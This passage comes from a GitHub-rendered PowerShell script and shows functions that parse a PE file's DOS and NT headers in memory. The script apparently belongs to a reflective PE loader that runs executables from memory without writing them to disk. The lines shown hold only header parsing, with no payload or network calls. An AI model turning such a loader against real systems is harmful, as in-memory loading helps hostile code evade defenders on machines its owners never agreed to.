          <td id="L1191" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1191"></td>
          <td id="LC1191" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$dosHeader</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_DOS_HEADER</span></span>)</td>
        </tr>
        <tr>
          <td id="L1192" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1192"></td>
          <td id="LC1192" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1193" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1193"></td>
          <td id="LC1193" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get IMAGE_NT_HEADERS</span></td>
        </tr>
        <tr>
          <td id="L1194" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1194"></td>
          <td id="LC1194" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$NtHeadersPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEHandle</span>) ([<span class="pl-k">Int64</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$dosHeader<span class="pl-smi">.e_lfanew</span></span>))</td>
        </tr>
        <tr>
          <td id="L1195" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1195"></td>
          <td id="LC1195" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name NtHeadersPtr <span class="pl-k">-</span>Value <span class="pl-smi">$NtHeadersPtr</span></td>
        </tr>
        <tr>
          <td id="L1196" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1196"></td>
          <td id="LC1196" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$imageNtHeaders64</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$NtHeadersPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_NT_HEADERS64</span></span>)</td>
        </tr>
        <tr>
          <td id="L1197" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1197"></td>
          <td id="LC1197" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1198" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1198"></td>
          <td id="LC1198" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Make sure the IMAGE_NT_HEADERS checks out. If it doesn&#39;t, the data structure is invalid. This should never happen.</span></td>
        </tr>
        <tr>
          <td id="L1199" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1199"></td>
          <td id="LC1199" class="blob-code blob-code-inner js-file-line">	    <span class="pl-k">if</span> (<span class="pl-smi">$imageNtHeaders64<span class="pl-smi">.Signature</span></span> <span class="pl-k">-ne</span> <span class="pl-c1">0x00004550</span>)</td>
        </tr>
        <tr>
          <td id="L1200" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1200"></td>
          <td id="LC1200" class="blob-code blob-code-inner js-file-line">	    {</td>
        </tr>
        <tr>
          <td id="L1201" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1201"></td>
          <td id="LC1201" class="blob-code blob-code-inner js-file-line">	        <span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Invalid IMAGE_NT_HEADER signature.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1202" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1202"></td>
          <td id="LC1202" class="blob-code blob-code-inner js-file-line">	    }</td>
        </tr>
        <tr>
          <td id="L1203" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1203"></td>
          <td id="LC1203" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1204" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1204"></td>
          <td id="LC1204" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$imageNtHeaders64<span class="pl-smi">.OptionalHeader.Magic</span></span> <span class="pl-k">-eq</span> <span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_NT_OPTIONAL_HDR64_MAGIC<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1205" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1205"></td>
          <td id="LC1205" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1206" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1206"></td>
          <td id="LC1206" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_NT_HEADERS <span class="pl-k">-</span>Value <span class="pl-smi">$imageNtHeaders64</span></td>
        </tr>
        <tr>
          <td id="L1207" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1207"></td>
          <td id="LC1207" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PE64Bit <span class="pl-k">-</span>Value <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L1208" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1208"></td>
          <td id="LC1208" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1209" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1209"></td>
          <td id="LC1209" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1210" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1210"></td>
          <td id="LC1210" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1211" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1211"></td>
          <td id="LC1211" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ImageNtHeaders32</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$NtHeadersPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_NT_HEADERS32</span></span>)</td>
        </tr>
        <tr>
          <td id="L1212" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1212"></td>
          <td id="LC1212" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_NT_HEADERS <span class="pl-k">-</span>Value <span class="pl-smi">$imageNtHeaders32</span></td>
        </tr>
        <tr>
          <td id="L1213" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1213"></td>
          <td id="LC1213" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PE64Bit <span class="pl-k">-</span>Value <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L1214" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1214"></td>
          <td id="LC1214" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1215" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1215"></td>
          <td id="LC1215" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1216" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1216"></td>
          <td id="LC1216" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$NtHeadersInfo</span></td>
        </tr>
        <tr>
          <td id="L1217" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1217"></td>
          <td id="LC1217" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1218" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1218"></td>
          <td id="LC1218" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1219" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1219"></td>
          <td id="LC1219" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1220" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1220"></td>
          <td id="LC1220" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>This function will get the information needed to allocated space in memory for the PE</span></td>
        </tr>
        <tr>
          <td id="L1221" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1221"></td>
          <td id="LC1221" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-PEBasicInfo</span></td>
        </tr>
        <tr>
          <td id="L1222" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1222"></td>
          <td id="LC1222" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1223" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1223"></td>
          <td id="LC1223" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1224" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1224"></td>
          <td id="LC1224" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span> )]</td>
        </tr>
        <tr>
          <td id="L1225" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1225"></td>
          <td id="LC1225" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L1226" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1226"></td>
          <td id="LC1226" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1227" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1227"></td>
          <td id="LC1227" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1228" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1228"></td>
          <td id="LC1228" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1229" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1229"></td>
          <td id="LC1229" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1230" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1230"></td>
          <td id="LC1230" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1231" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1231"></td>
          <td id="LC1231" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1232" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1232"></td>
          <td id="LC1232" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1233" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1233"></td>
          <td id="LC1233" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L1234" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1234"></td>
          <td id="LC1234" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1235" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1235"></td>
          <td id="LC1235" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Write the PE to memory temporarily so I can get information from it. This is not it&#39;s final resting spot.</span></td>
        </tr>
        <tr>
          <td id="L1236" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1236"></td>
          <td id="LC1236" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$UnmanagedPEBytes</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$PEBytes<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1237" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1237"></td>
          <td id="LC1237" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$UnmanagedPEBytes</span><span class="pl-k">,</span> <span class="pl-smi">$PEBytes<span class="pl-smi">.Length</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1238" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1238"></td>
          <td id="LC1238" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1239" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1239"></td>
          <td id="LC1239" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get NtHeadersInfo</span></td>
        </tr>
        <tr>
          <td id="L1240" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1240"></td>
          <td id="LC1240" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ImageNtHeaders</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$UnmanagedPEBytes</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1241" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1241"></td>
          <td id="LC1241" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1242" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1242"></td>
          <td id="LC1242" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Build a structure with the information which will be needed for allocating memory and writing the PE to memory</span></td>
        </tr>
        <tr>
          <td id="L1243" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1243"></td>
          <td id="LC1243" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>PE64Bit<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.PE64Bit</span></span>)</td>
        </tr>
        <tr>
          <td id="L1244" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1244"></td>
          <td id="LC1244" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>OriginalImageBase<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span></span>)</td>
        </tr>
        <tr>
          <td id="L1245" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1245"></td>
          <td id="LC1245" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfImage<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage</span></span>)</td>
        </tr>
        <tr>
          <td id="L1246" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1246"></td>
          <td id="LC1246" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeaders<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders</span></span>)</td>
        </tr>
        <tr>
          <td id="L1247" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1247"></td>
          <td id="LC1247" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>DllCharacteristics<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics</span></span>)</td>
        </tr>
        <tr>
          <td id="L1248" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1248"></td>
          <td id="LC1248" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1249" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1249"></td>
          <td id="LC1249" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Free the memory allocated above, this isn&#39;t where we allocate the PE to memory</span></td>
        </tr>
        <tr>
          <td id="L1250" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1250"></td>
          <td id="LC1250" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::FreeHGlobal(<span class="pl-smi">$UnmanagedPEBytes</span>)</td>
        </tr>
        <tr>
          <td id="L1251" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1251"></td>
          <td id="LC1251" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1252" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1252"></td>
          <td id="LC1252" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$PEInfo</span></td>
        </tr>
        <tr>
          <td id="L1253" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1253"></td>
          <td id="LC1253" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1254" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1254"></td>
          <td id="LC1254" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1255" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1255"></td>
          <td id="LC1255" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1256" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1256"></td>
          <td id="LC1256" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>PEInfo must contain the following NoteProperties:</span></td>
        </tr>
        <tr>
          <td id="L1257" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1257"></td>
          <td id="LC1257" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>	PEHandle: An IntPtr to the address the PE is loaded to in memory</span></td>
        </tr>
        <tr>
          <td id="L1258" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1258"></td>
          <td id="LC1258" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-PEDetailedInfo</span></td>
        </tr>
        <tr>
          <td id="L1259" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1259"></td>
          <td id="LC1259" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1260" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1260"></td>
          <td id="LC1260" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1261" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1261"></td>
          <td id="LC1261" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1262" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1262"></td>
          <td id="LC1262" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1263" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1263"></td>
          <td id="LC1263" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1264" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1264"></td>
          <td id="LC1264" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1265" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1265"></td>
          <td id="LC1265" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1266" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1266"></td>
          <td id="LC1266" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1267" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1267"></td>
          <td id="LC1267" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1268" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1268"></td>
          <td id="LC1268" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1269" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1269"></td>
          <td id="LC1269" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1270" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1270"></td>
          <td id="LC1270" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1271" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1271"></td>
          <td id="LC1271" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L1272" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1272"></td>
          <td id="LC1272" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1273" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1273"></td>
          <td id="LC1273" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1274" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1274"></td>
          <td id="LC1274" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEHandle</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span> <span class="pl-k">-or</span> <span class="pl-smi">$PEHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1275" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1275"></td>
          <td id="LC1275" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1276" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1276"></td>
          <td id="LC1276" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&#39;</span>PEHandle is null or IntPtr.Zero<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L1277" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1277"></td>
          <td id="LC1277" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1278" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1278"></td>
          <td id="LC1278" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1279" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1279"></td>
          <td id="LC1279" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Object</td>
        </tr>
        <tr>
          <td id="L1280" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1280"></td>
          <td id="LC1280" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1281" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1281"></td>
          <td id="LC1281" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get NtHeaders information</span></td>
        </tr>
        <tr>
          <td id="L1282" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1282"></td>
          <td id="LC1282" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$NtHeadersInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-ImageNtHeaders</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1283" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1283"></td>
          <td id="LC1283" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1284" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1284"></td>
          <td id="LC1284" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Build the PEInfo object</span></td>
        </tr>
        <tr>
          <td id="L1285" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1285"></td>
          <td id="LC1285" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PEHandle <span class="pl-k">-</span>Value <span class="pl-smi">$PEHandle</span></td>
        </tr>
        <tr>
          <td id="L1286" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1286"></td>
